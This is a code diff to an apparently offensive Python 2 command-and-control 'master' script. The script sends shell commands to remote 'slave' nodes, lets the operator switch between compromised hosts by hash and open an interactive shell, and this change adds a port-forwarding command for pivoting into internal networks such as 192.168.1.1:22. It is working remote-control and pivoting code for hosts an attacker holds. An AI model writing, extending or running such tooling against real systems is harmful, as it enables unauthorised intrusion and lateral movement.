@@ -9,6 +9,8 @@ import sys
 import os
 
 from slave import slaver
+from slave import port_data_to_int
+from slave import int_to_port_data
 
 slaves = {}
 
@@ -30,7 +32,7 @@ class Slave():
         print "[+] Port : %s" % (self.port)
 
     def shell_exec(self, shell_command):
-        CMD = "\x00"
+        CMD = "\x00" # Shell Exec CMD
         LENGTH = chr(len(shell_command) % 0x100) # Robust
         data = CMD + LENGTH + shell_command
         # print "[+] Sending data : %s" % (repr(data))
@@ -47,6 +49,12 @@ class Slave():
     def close_connection(self):
         self.socket_fd.shutdown(socket.SHUT_RDWR)
         self.socket_fd.close()
+
+    def port_forwarding(self, listen_host, listen_port, dst_host, dst_port):
+        CMD = "\x01" # Post Forwarding CMD
+        data = CMD + listen_host + listen_port + dst_host + dst_port
+        print "[+] Sending data : %s" % (repr(data))
+        self.socket_fd.send(data)
 
 def master(host, port):
     print "[+] Master starting at %s:%d" % (host, port)
@@ -69,6 +77,7 @@ def show_commands():
     print "        1. [i] : interactive shell"
     print "        2. [g] : goto a slave"
     print "        3. [c] : interact an shell"
+    print "        3. [f] : port forwarding"
     print "        3. [q|quit|exit] : interact an shell"
 
 def node_hash(host, port):
@@ -103,8 +112,11 @@ def main():
         elif command == "p":
             print "[+] Now position node hash : %s" % (position)
         elif command == "g":
-            input_node_hash = raw_input("[+] Please input target node hash : ")
+            input_node_hash = raw_input("[+] Please input target node hash : ") or position
             print "[+] Input node hash : %s" % (repr(input_node_hash))
+            if input_node_hash == position:
+                print "[+] Position will not change!"
+                continue
             found = False
             for key in slaves.keys():
                 if key.startswith(input_node_hash):
@@ -113,11 +125,19 @@ def main():
                     print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port)
                     position = key
                     found = True
+                    break
             if not found:
                 print "[-] Please check your input node hash!"
                 print "[-] Position is not changed!"
         elif command == "s":
             slaves[position].show_info()
+        elif command == "f":
+            listen_host = socket.inet_aton(raw_input("Input listen host (0.0.0.0) : ") or "0.0.0.0")
+            listen_port = int_to_port_data(int(raw_input("Input listen port (8080) : ") or "8080"))
+            dst_host = socket.inet_aton(raw_input("Input listen host (192.168.1.1) : ") or "192.168.1.1")
+            dst_port = int_to_port_data(int(raw_input("Input listen port (22) : ") or "22"))
+            slave = slaves[position]
+            slave.port_forwarding(listen_host, listen_port, dst_host, dst_port)
         elif command == "i":
             slave = slaves[position]
             while True:
